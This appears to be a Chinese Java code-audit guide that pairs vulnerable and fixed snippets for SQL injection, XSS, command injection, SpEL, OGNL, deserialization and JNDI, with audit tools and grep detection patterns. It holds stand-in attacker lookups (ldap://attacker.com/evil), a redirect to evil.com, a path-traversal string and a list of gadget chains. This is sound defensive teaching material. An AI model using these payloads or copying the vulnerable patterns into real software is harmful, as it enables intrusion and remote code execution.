---
id: 12-006
title: "☕ Java代码审计 (Java Code Audit)"
category: 代码审计
category_en: "Code Audit"
difficulty: ★★★★
tools: "FindSecBugs, SpotBugs, Fortify, Semgrep"
last_updated: 2025-07
tags: ["code-audit", "static-analysis", "php-audit", "java-audit", "javascript-audit"]
subdomain: code-audit
nist_csf: ["PR.IP-12", "ID.RA-01"]
mitre_attack: []
---
# ☕ Java代码审计 (Java Code Audit)

## 概述
审查Java Web应用和框架中的安全漏洞，包括Spring、Struts2等框架特有漏洞和通用安全问题。

## 核心技能

### 1. Java Web漏洞模式

```java
// --- SQL注入 ---
// 危险: 字符串拼接SQL
String sql = "SELECT * FROM users WHERE id = " + request.getParameter("id");
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);

// 安全: 参数化查询 (PreparedStatement)
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement psmt = conn.prepareStatement(sql);
psmt.setInt(1, Integer.parseInt(request.getParameter("id")));
// 使用MyBatis时:
// 危险: ${id}  安全: #{id}

// --- XSS ---
// 危险: 直接输出
out.println("<div>" + request.getParameter("name") + "</div>");

// 安全: 输出编码
out.println("<div>" + StringEscapeUtils.escapeHtml4(request.getParameter("name")) + "</div>");

// 或使用JSTL: <c:out value="${param.name}" />

// --- 命令注入 ---
// 危险
Runtime.getRuntime().exec("ping -c 3 " + request.getParameter("ip"));

// 安全
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "3", validateIP(request.getParameter("ip")));

// --- 文件上传 ---
// 危险
String path = request.getParameter("path");
// 路径遍历: ../../../etc/passwd

// 安全
String filename = new File(request.getParameter("name")).getName();
```

### 2. Spring框架安全审计

```java
// --- SpEL注入 ---
// 危险: 用户可控的SpEL表达式
@GetMapping("/eval")
public String eval(String expr) {
    ExpressionParser parser = new SpelExpressionParser();
    return parser.parseExpression(expr).getValue().toString();  // 危险!
}

// 安全: 参数检查
@GetMapping("/eval")
public String eval(String expr) {
    // 只允许预定义的表达式
    List<String> allowed = Arrays.asList("user.name", "config.version");
    if (allowed.contains(expr)) {
        ExpressionParser parser = new SpelExpressionParser();
        return parser.parseExpression(expr).getValue().toString();
    }
    return "Invalid expression";
}

// --- Spring Boot Actuator ---
// 生产环境不应暴露
// application.yml 应配置:
// management.endpoints.web.exposure.exclude: "*"
// 或仅暴露 health 端点

// --- Spring Data JPA ---
// 方法名SQL注入
// 危险:
@Query(value = "SELECT * FROM users WHERE name = " + ":#{#name}", nativeQuery = true)
// 安全:
@Query("SELECT u FROM User u WHERE u.name = :name")

// --- Spring Security配置错误 ---
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .authorizeRequests()
            .antMatchers("/admin/**").hasRole("ADMIN")
            .antMatchers("/api/**").permitAll()  // 危险! API完全开放
            .anyRequest().authenticated();
    }
}
```

### 3. Struts2框架审计

```java
// --- OGNL注入 (Struts2核心问题) ---
// 危险: 直接使用用户输入
// struts.xml
<action name="test" class="TestAction">
    <result name="success">/${msg}.jsp</result>  // OGNL表达式解析
</action>

// S2-001 - S2-061 都是OGNL注入
// 检测: %{...} 或 ${...} 表达式

// --- Struts2 结果重定向 ---
// 危险
<result type="redirect">/view/${param}</result>

// --- S2-016 参数操作 ---
// 'redirect:' + 用户输入 + '.action'
// 可修改为: redirect:http://evil.com

// --- DMI (Dynamic Method Invocation) ---
// 如果 DMI 启用，可能绕过权限控制
<constant name="struts.enable.DynamicMethodInvocation" value="true" />  // 危险
```

### 4. 反序列化审计

```java
// --- Java反序列化漏洞 ---
// 危险: 未过滤的反序列化
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // 危险!

// 检测readObject()
// 常见利用链:
// CommonsCollections1-7
// CommonsBeanUtils
// Fastjson
// Jackson
// Xstream
// SnakeYAML

// --- Fastjson反序列化 ---
// 危险
JSON.parse(request.getParameter("data"));  // 自动开启autoType

// 安全
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
JSON.parseObject(request.getParameter("data"), User.class);  // 指定类型

// --- Jackson反序列化 ---
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();  // 危险: 启用默认类型
Object obj = mapper.readValue(request.getParameter("json"), Object.class);

// 安全: 限制白名单
mapper.activateDefaultTyping(
    BasicPolymorphicTypeValidator.builder()
        .allowIfSubType(User.class)
        .build(),
    ObjectMapper.DefaultTyping.NON_FINAL
);
```

### 5. 配置安全审计

```java
// --- web.xml安全配置 ---
<?xml version="1.0" encoding="UTF-8"?>
<web-app>
    <!-- 安全响应头（通过Filter设置） -->
    <!-- X-Content-Type-Options: nosniff -->
    <!-- X-Frame-Options: DENY -->
    <!-- X-XSS-Protection: 1; mode=block -->
    <!-- Content-Security-Policy -->
    <!-- Strict-Transport-Security -->
    
    <!-- Session配置 -->
    <session-config>
        <session-timeout>30</session-timeout>
        <cookie-config>
            <http-only>true</http-only>
            <secure>true</secure>
        </cookie-config>
        <tracking-mode>COOKIE</tracking-mode>
    </session-config>
    
    <!-- 错误页面（防止信息泄露） -->
    <error-page>
        <error-code>500</error-code>
        <location>/error.jsp</location>
    </error-page>
</web-app>

// --- log4j2安全配置 ---
// 修复CVE-2021-44228
// JVM参数: -Dlog4j2.formatMsgNoLookups=true
// 系统变量: LOG4J_FORMAT_MSG_NO_LOOKUPS=true
// 或升级到 log4j 2.17.0+

// --- JDBC URL注入 ---
// 危险: 用户可控JDBC参数
String url = "jdbc:mysql://localhost:3306/" + request.getParameter("db") + "?autoDeserialize=true";
// autoDeserialize=true 可能导致反序列化漏洞
```

### 6. JNDI注入审计

```java
// --- JNDI注入 (Log4Shell的根本原因) ---
// 危险: 用户输入传入JNDI查找
Context ctx = new InitialContext();
Object obj = ctx.lookup(request.getParameter("name"));  // ldap://attacker.com/evil

// ldap://13800/Command
// rmi://13800/Command
// dns://attacker.com

// 常见检测:
// - Jndi 查找到用户可控的字符串
// - LDAP/RMI/DNS URL拼接
// - log4j 中的 ${jndi:ldap://...}

// --- 修复方法 ---
// 1. 升级JDK版本 (8u191+ 默认禁用远程codebase)
// 2. 禁止外部协议
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
// 3. 过滤用户输入
```

### 7. 自动化审计工具

```bash
# FindBugs/SpotBugs - 字节码分析
spotbugs -textui -include include.xml -exclude exclude.xml -output report.xml MyApp.jar

# Find Security Bugs (SpotBugs插件)
# 专门针对Web安全漏洞
spotbugs -textui -plugin find-sec-bugs.jar MyApp.jar

# Soot - 程序分析框架
# 可分析数据流和控制流

# PMD - 静态代码分析
pmd -d src/ -f html -R category/security.xml -reportfile pmd_report.html

# OWASP Dependency Check - 依赖库漏洞检查
dependency-check --scan /path/to/project --format HTML

# 使用grep搜索漏洞模式
# 搜索反序列化
grep -rn "readObject\|ObjectInputStream\|unmarshal\|fromXML\|parseObject" --include="*.java"

# 搜索命令执行
grep -rn "Runtime.getRuntime\|ProcessBuilder\|exec(" --include="*.java" | grep -v "\.exec("

# 搜索JNDI
grep -rn "InitialContext\|jndi\|Jndi" --include="*.java"

# 搜索文件上传（未做校验）
grep -rn "multipart\|fileUpload\|FileUpload\|transferTo\|write(" --include="*.java"
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Find Security Bugs | Java安全审计插件 | https://find-sec-bugs.github.io/ |
| SpotBugs | 字节码分析 | https://spotbugs.github.io/ |
| OWASP Dependency Check | 依赖漏洞检查 | https://owasp.org/www-project-dependency-check/ |
| SonarQube | 持续代码质量 | https://www.sonarqube.org/ |
| Checkmarx | SAST商业工具 | https://checkmarx.com/ |
| Fortify | SAST商业工具 | https://www.microfocus.com/fortify |
| Soot | 程序分析框架 | https://github.com/soot-oss/soot |

## 参考资源
- [OWASP Java Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Java_Security_Cheat_Sheet.html)
- [Spring Security Architecture](https://spring.io/guides/topicals/spring-security-architecture/)
- [Find Security Bugs Documentation](https://find-sec-bugs.github.io/bugs.htm)
- [HackTricks - Java](https://book.hacktricks.xyz/pentesting-web/deserialization)
- [Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
